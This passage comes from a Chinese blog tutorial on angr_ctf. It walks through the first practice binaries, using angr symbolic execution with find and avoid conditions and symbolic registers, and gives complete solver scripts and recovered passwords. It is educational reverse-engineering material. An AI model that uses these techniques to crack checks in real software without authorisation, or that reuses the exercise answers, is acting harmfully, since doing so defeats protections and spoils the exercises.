class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后看 <code>main</code> 函数的内容：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> ???  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>path_to_binary</code> 指定可执行程序路径</li><li><code>angr.Project()</code> 创建一个 <code>Project</code> 实例</li><li><code>project.factory.entry_state()</code> 在程序入口点创建程序状态，类似于一个快照</li><li><code>project.factory.simgr()</code> 告诉符号执行引擎从 <code>initial_state</code> 处开始符号执行</li></ul><p>接下来的两行代码是关键：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">print_good_address <span class="token operator">=</span> ???simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p><code>print_good_address</code> 是打印”Good Job”的地址</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220426235759712.png" alt="image-20220426235759712"></p></li><li><p><code>simulation.explore()</code> 告诉符号执行引擎，我们想要到达的代码位置</p></li></ul><p>最后几行代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若符号执行引擎找到正确路径，将输入给 <code>stdin</code>，否则抛异常。</p><p>修改整体代码，得到完整代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./00_angr_find"</span> <span class="token comment"># path of the binary program</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  print_good_address <span class="token operator">=</span> <span class="token number">0x8048678</span>  <span class="token comment"># :integer (probably in hexadecimal)</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success! Solution is: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后执行 scaffold00.py 得到需要输入的字符串”JXWVXRKX”：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427000053246.png" alt="image-20220427000053246"></p><h1 id="Part-1-angr-find-condition"><a href="#Part-1-angr-find-condition" class="headerlink" title="Part 1 angr find condition"></a>Part 1 angr find condition</h1><p>在上面简单的认识了一下 angr，接下来学习如何避免不需要的状态以减少符号执行的时间。先跳过 01_angr_avoid，因为它和上面的题目是一样的，但需要我们指定和避免某些路径，可以借 02_angr_find_condition 来学习 angr 的 avoid 功能。用 IDA 打开二进制文件，可以发现有很多块都会打印“Good Job”或“Try again”：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427105401322.png" alt="image-20220427105401322"></p><p>记录所有的这些块起始地址不太现实，数量太多了，但可以根据它打印到标准输出的内容告诉 angr 保留或丢弃。打开 scaffold02.py 文件：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码大部分都和前一个例子相同，就不赘述了。主要看中间部分：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>   stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>   stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span> simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测 <code>is_successful()</code> 对状态进行检测，检测它的结果是否输出 “Good Job”。根据分析修改代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>     <span class="token keyword">return</span> <span class="token boolean">True</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再修改 <code>should_abort()</code> 函数，可以看出来和 <code>is_successful()</code> 功能相同：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span>  stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>simulation.explore(find=is_successful, avoid=should_abort)</code> 告诉 angr，只对”Good Job”感兴趣，要避免”Try again”的路径。<code>find</code> 和 <code>avoid</code> 参数可以是一个地址或地址列表。</p><p>最后完整代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./02_angr_find_condition"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span>  stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success! Solution is: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后很快得到结果”HETOBRCU”</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427111953296.png" alt="image-20220427111953296"></p><h1 id="Part-2-angr-symbolic-registers"><a href="#Part-2-angr-symbolic-registers" class="headerlink" title="Part 2 angr symbolic registers"></a>Part 2 angr symbolic registers</h1><p>现在考虑一种情况，如果 angr 无法从指定的地址开始符号执行该如何处理？换个说法，angr 在处理类似 <code>scanf(&quot;%x %x %x&quot;, &amp;a, &amp;b, &amp;c)</code> 这种输入方式的时候尤为吃力，就得考虑另外一种办法。我们可以跳过这个输入函数，在用到输入参数的时候我们自定义寄存器的值，这样就可以达到我们的目的。</p><p>首先老规矩，先在 IDA 看看二进制程序 03_angr_symbolic_registers。主函数中 <code>get_user_input</code> 接收用户输入，将用户输入经过 <code>complex_function</code> 的处理，最后输出”Good Job”或”Try again”：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427140721086.png" alt="image-20220427140721086"></p><p>再看看 <code>get_user_input</code> 函数，正如上面说的那样，使用 <code>scanf</code> 这种复杂的方式接受输入。它将参数依次给了 EAX、EBX、EDX寄存器，了解参数传递的寄存器有利于使用 angr 进行参数模拟：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427141347745.png" alt="image-20220427141347745"></p><p>然后查看 scaffold03.py 代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> ???  <span class="token comment"># :integer (probably hexadecimal)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    password0_size_in_bits <span class="token operator">=</span> ???  <span class="token comment"># :integer</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> password0_size_in_bits<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>??? <span class="token operator">=</span> password0  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    solution <span class="token operator">=</span> ???  <span class="token comment"># :string</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>      <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先 <code>start_address</code> 依然设置我们希望的起始地址，也就是调用 <code>scanf</code> 之后的地址 0x08048937。然后注意这里是使用的 <code>blank_state</code> 而不是 <code>entry_state</code>，实际上是告诉 angr 在该地址创建一个新的 state。<code>claripy.BVS</code> 表示使用 claripy 中的 <code>BVS</code> 方法生成位向量，它有两个参数，第一个参数”password0”就像是方程里面的符号“x”，第二个参数 <code>password0_size_in_bits</code> 表示所用的数值的二进制位数，<code>int</code> 型就是32位。<code>initial_state.regs</code> 将使用创建的位向量，将值指定给寄存器。之后定义 <code>find</code> 和 <code>avoid</code> 状态。<code>solution_state.se.eval</code> 方法可以看作是求解定义的位向量，最后打印求解的结果。</p><p>依照上面分析的结果修改代码，但是有一个问题，那就是在我们的起始地址在 <code>scanf</code> 函数之后，函数返回需要平衡栈，也就是说还得伪造一个栈的内容。其实这就有点过于复杂了，再次观察代码可以得知在 <code>get_user_input</code> 函数返回之后将参数给到了 EAX、EBX、EDX，我们可以直接从这里开始给寄存器赋值就行了：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427144214207.png" alt="image-20220427144214207"></p><p>完整代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./03_angr_symbolic_registers"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x08048980</span>  <span class="token comment"># :integer (probably hexadecimal)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password_size_in_bits <span class="token operator">=</span> <span class="token number">32</span>  <span class="token comment"># :integer</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> password_size_in_bits<span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> password_size_in_bits<span class="token punctuation">)</span>  password2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password2'</span><span class="token punctuation">,</span> password_size_in_bits<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> password0  initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> password1  initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>edx <span class="token operator">=</span> password2  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.\n'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.\n'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>    solution2 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>    solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution1 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution2  <span class="token comment"># :string</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后得到结果：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427145237549.png" alt="image-20220427145237549"></p><h1 id="Part-3-angr-symbolic-stack"><a href="#Part-3-angr-symbolic-stack" class="headerlink" title="Part 3 angr symbolic stack"></a>Part 3 angr symbolic stack</h1><p>在 Part 2 